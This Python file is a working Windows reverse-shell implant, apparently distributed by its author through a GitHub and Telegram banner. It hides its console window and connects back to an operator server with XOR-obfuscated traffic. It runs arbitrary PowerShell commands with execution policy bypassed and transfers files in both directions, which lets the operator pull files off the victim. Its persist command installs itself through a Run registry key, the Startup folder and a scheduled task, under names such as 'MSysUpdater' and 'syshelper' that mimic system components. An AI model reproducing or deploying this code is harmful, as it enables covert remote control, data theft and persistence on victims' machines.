#######################################################
####   MyGitHub : https://github.com/The-Lxx-CLoUD ####
####                                               ####
####     MyTelegram : https://t.me/lxxcloud        ####
#######################################################


import os
import sys
import time
import socket
import base64
import shutil
import struct
import subprocess

RHOST = "127.0.0.1"   # server ip 
RPORT = 1080          # server port 
XOR_KEY = 0           # Same password between client and server
MAX_BACKOFF = 60      # Interconnect latency limit (seconds)
CMD_TIMEOUT = 120    # Timeout for each command (seconds)
RECV_TIMEOUT = 300   # Disconnect after this period of silence (seconds)
LOG_PATH = os.path.join(os.environ.get("TEMP", "."), "rshell.log")


def log(msg):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as fh:
            fh.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except Exception:
        pass


def x(data: bytes) -> bytes:
    if not XOR_KEY:
        return data
    return bytes(b ^ XOR_KEY for b in data)


def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("connection closed")
        buf += chunk
    return buf


def send_msg(sock, text: str) -> None:
    payload = x(text.encode("utf-8", errors="replace"))
    sock.sendall(struct.pack(">I", len(payload)) + payload)


def recv_msg(sock) -> str:
    (n,) = struct.unpack(">I", recv_exact(sock, 4))
    return x(recv_exact(sock, n)).decode("utf-8", errors="replace").strip()


def hide_window():
    ####     MyTelegram : https://t.me/lxxcloud       
    if sys.platform == "win32":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(
                ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass


def run_powershell(cmd: str) -> str:
    try:
        proc = subprocess.run(
            ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
             "-Command", cmd],
            capture_output=True, timeout=CMD_TIMEOUT, cwd=os.getcwd())
        out = (proc.stdout or b"") + (proc.stderr or b"")
        return out.decode("utf-8", errors="replace").strip()
    except subprocess.TimeoutExpired:
        return "[!] command timed out"
    except Exception as e:
        return f"[!] execution error: {e}"


def do_download(path: str) -> str:
    if not os.path.isfile(path):
        return f"ERR file not found: {path}"
    try:
        with open(path, "rb") as fh:
            b64 = base64.b64encode(fh.read()).decode()
        return "FILE:" + b64
    except Exception as e:
        return f"ERR download: {e}"


def do_upload(path: str, b64: str) -> str:
    try:
        raw = base64.b64decode(b64)
        with open(path, "wb") as fh:
            fh.write(raw)
        return f"OK uploaded {len(raw)} bytes -> {path}"
    except Exception as e:
        return f"ERR upload: {e}"


def do_persist() -> str:
    try:
        src = os.path.abspath(sys.argv[0])
        appdata = os.environ.get("APPDATA", os.path.expanduser("~"))
        dst_dir = os.path.join(appdata, "MSysHelper")
        os.makedirs(dst_dir, exist_ok=True)

        ext = ".exe" if src.lower().endswith(".exe") else ".pyw"
        dst = os.path.join(dst_dir, "syshelper" + ext)
        if os.path.abspath(src) != os.path.abspath(dst):
            shutil.copy2(src, dst)

        if ext == ".exe":
            runner = f'"{dst}"'
        else:
            pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
            if not os.path.isfile(pythonw):
                pythonw = "pythonw.exe"
            runner = f'"{pythonw}" "{dst}"'

        subprocess.run(
            ["reg", "add",
             r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
             "/v", "MSysUpdater", "/t", "REG_SZ", "/d", runner, "/f"],
            capture_output=True)
        startup = os.path.join(
            os.environ.get("APPDATA", ""),
            r"Microsoft\Windows\Start Menu\Programs\Startup")
        if os.path.isdir(startup):
            shutil.copy2(dst, os.path.join(startup, "syshelper" + ext))
        subprocess.run(
            ["schtasks", "/create", "/tn", "MSysUpdater", "/sc", "onlogon",
             "/tr", runner, "/f"],
            capture_output=True)
        return f"OK persistence installed -> {dst}"
    except Exception as e:
        return f"ERR persist: {e}"


def session(sock) -> None:
    send_msg(sock, f"HELLO {os.getcwd()} {sys.platform}")
    log(f"connected to {sock.getpeername()} | HELLO sent")

    while True:
        line = recv_msg(sock)
        if not line:
            continue
        log(f"<< {line[:300]}")

        low = line.lower()
        if low in ("exit", "quit"):
            send_msg(sock, "BYE")
            return
        elif low == "persist":
            send_msg(sock, do_persist())
        elif low in ("pwd", "cd"):
            send_msg(sock, os.getcwd())
        elif low.startswith("cd "):
            target = line[3:].strip()
            try:
                os.chdir(target)
                send_msg(sock, os.getcwd())
            except Exception as e:
                send_msg(sock, f"ERR cd: {e}")
        elif low.startswith("download "):
            send_msg(sock, do_download(line[9:].strip()))
        elif low.startswith("upload "):
            remote = line[7:].strip()
            b64 = recv_msg(sock)          
            send_msg(sock, do_upload(remote, b64))
        else:
            send_msg(sock, run_powershell(line))

   ####     MyTelegram : https://t.me/lxxcloud        ####
def main() -> None:
    hide_window()
    backoff = 1
    while True:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(RECV_TIMEOUT)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.connect((RHOST, RPORT))
            backoff = 1
            session(sock)
        except Exception as e:
            log(f"error: {e}")
        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass
        time.sleep(backoff)
        backoff = min(backoff * 2, MAX_BACKOFF)


if __name__ == "__main__":
    main()